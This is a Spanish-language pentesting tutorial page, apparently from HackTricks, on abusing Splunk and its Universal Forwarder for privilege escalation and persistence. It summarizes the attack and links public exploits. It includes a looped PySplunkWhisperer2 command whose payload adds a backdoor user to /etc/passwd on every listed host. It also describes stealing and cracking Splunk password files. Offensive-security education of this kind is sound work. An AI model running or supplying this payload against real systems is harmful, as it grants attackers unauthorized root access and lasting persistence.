# Splunk LPE y Persistencia

{{#include ../../banners/hacktricks-training.md}}

Si **enumerando** una máquina **internamente** o **externamente** encuentras **Splunk en ejecución** (puerto 8090), si tienes la suerte de conocer alguna **credencial válida** puedes **abusar del servicio de Splunk** para **ejecutar un shell** como el usuario que ejecuta Splunk. Si lo está ejecutando root, puedes escalar privilegios a root.

Además, si ya eres root y el servicio de Splunk no está escuchando solo en localhost, puedes **robar** el archivo de **contraseña** **del** servicio de Splunk y **crackear** las contraseñas, o **agregar nuevas** credenciales a él. Y mantener persistencia en el host.

En la primera imagen a continuación puedes ver cómo se ve una página web de Splunkd.

## Resumen de la Explotación del Agente Splunk Universal Forwarder

Para más detalles, consulta la publicación [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Esto es solo un resumen:

**Descripción de la Explotación:**
Una explotación que apunta al Agente Splunk Universal Forwarder (UF) permite a los atacantes con la contraseña del agente ejecutar código arbitrario en sistemas que ejecutan el agente, comprometiendo potencialmente toda una red.

**Puntos Clave:**

- El agente UF no valida las conexiones entrantes ni la autenticidad del código, lo que lo hace vulnerable a la ejecución no autorizada de código.
- Los métodos comunes de adquisición de contraseñas incluyen localizarlas en directorios de red, comparticiones de archivos o documentación interna.
- La explotación exitosa puede llevar a acceso a nivel de SYSTEM o root en hosts comprometidos, exfiltración de datos y mayor infiltración en la red.

**Ejecución de la Explotación:**

1. El atacante obtiene la contraseña del agente UF.
2. Utiliza la API de Splunk para enviar comandos o scripts a los agentes.
3. Las acciones posibles incluyen extracción de archivos, manipulación de cuentas de usuario y compromiso del sistema.

**Impacto:**

- Compromiso total de la red con permisos de nivel SYSTEM/root en cada host.
- Potencial para deshabilitar el registro para evadir la detección.
- Instalación de puertas traseras o ransomware.

**Ejemplo de Comando para la Explotación:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits públicos utilizables:**

- https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
- https://www.exploit-db.com/exploits/46238
- https://www.exploit-db.com/exploits/46487

## Abusando de las consultas de Splunk

**Para más detalles, consulta la publicación [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{{#include ../../banners/hacktricks-training.md}}
